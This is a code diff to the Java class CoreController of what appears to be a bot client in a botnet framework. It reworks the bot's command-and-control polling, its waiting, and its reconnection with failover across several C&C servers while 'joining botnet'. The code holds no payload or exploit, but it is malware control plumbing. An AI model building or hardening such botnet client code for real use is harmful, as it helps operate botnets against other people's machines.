@@ -187,9 +187,8 @@ public class CoreController {
           } finally {
             if (!cmd.getScope().equals(CommandScope.KILL) &&
                 !cmd.getScope().equals(CommandScope.RESTART)) {
-              try {
-                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
-              } catch (InterruptedException ignored) {}
+              LOGGER.info("Waiting for polling from C&C at {}", CONTROLLER.getCmdResource());
+              wait(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
             }
           }
 
@@ -211,9 +210,8 @@ public class CoreController {
             if (!cmdWhileSleeping.getScope().equals(CommandScope.WAKEUP) &&
                 !cmdWhileSleeping.getScope().equals(CommandScope.KILL) &&
                 !cmdWhileSleeping.getScope().equals(CommandScope.RESTART)) {
-              try {
-                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
-              } catch (InterruptedException ignored) {}
+              LOGGER.info("Waiting for polling from C&C at {}", CONTROLLER.getCmdResource());
+              wait(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
             }
           }
 
@@ -285,27 +283,15 @@ public class CoreController {
     }
 
     if (!checkController(controller)) {
-      throw new ControllerConnectionException("Not a valid controller. %s.", controller);
+      throw new ControllerConnectionException("Not a valid controller.");
     }
 
-    final String initResource = controller.getInitResource();
-    LOGGER.info("Contacting C&C at {}...", initResource);
-
-    long failures = 0;
     try {
       ControllerProperties controllerProps = BotControllerInteractions.getInitialization(controller);
       if (controller.getAuthentication() == null) controller.setAuthentication(new HashMap<>());
       controller.getAuthentication().putAll(controllerProps.getAuthentication());
     } catch (IOException exc) {
-      failures++;
-      if (failures <= controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections())) {
-        try {
-          LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
-          waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
-        } catch (InterruptedException ignored) { /* ignored */}
-      } else {
-        throw new ControllerConnectionException("Maximum number of reconnections reached for C&C at {}", initResource);
-      }
+      throw new ControllerConnectionException("Cannot load controller configuration.");
     }
     CONTROLLER = controller;
   }
@@ -322,18 +308,30 @@ public class CoreController {
     LOGGER.info("Joining botnet...");
     boolean success = false;
     int controllerId = 0;
+    long failures = 0;
     Controller controller;
     while (!success) {
       controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
+      long maxFailures = controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections());
+      Interval reconnectionWait = controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait());
       try {
+        LOGGER.info("Contacting controller at {}...", controller.getInitResource());
         joinBotnetWithController(controller);
         success = true;
       } catch (ControllerConnectionException exc) {
-        LOGGER.warn("Cannot join botnet with C&C at {}. {}", controller.getInitResource(), exc.getMessage());
-        if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
-          controllerId++;
+        LOGGER.warn("Cannot connect to C&C at {}. {}", controller.getInitResource(), exc.getMessage());
+        failures++;
+        if (failures <= maxFailures) {
+          Duration duration = reconnectionWait.getRandomDuration();
+          LOGGER.info("Waiting for reconnection {}...", duration);
+          wait(duration);
         } else {
-          throw new BotnetJoinException("Cannot join botnet. All C&C are unreachable.");
+          LOGGER.warn("Aborting connection to C&C at {}...", controller.getInitResource());
+          if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
+            controllerId++;
+          } else {
+            throw new BotnetJoinException("Cannot join botnet. All C&C are unreachable.");
+          }
         }
       }
     }
@@ -728,13 +726,13 @@ public class CoreController {
   /**
    * Make the bot sleep for the specified duration.
    * @param timeout the sleeping period.
-   * @throws InterruptedException when the sleeping is interrupted.
    */
-  private static void waitPolling(Duration timeout) throws InterruptedException {
+  private static void wait(Duration timeout) {
     final long amount = timeout.getAmount();
     final TimeUnit unit = timeout.getUnit();
-    LOGGER.info("Waiting for polling {} {}...", amount, unit);
-    unit.sleep(amount);
+    try {
+      unit.sleep(amount);
+    } catch (InterruptedException ignored) { /* ignored */}
   }
 
   /**
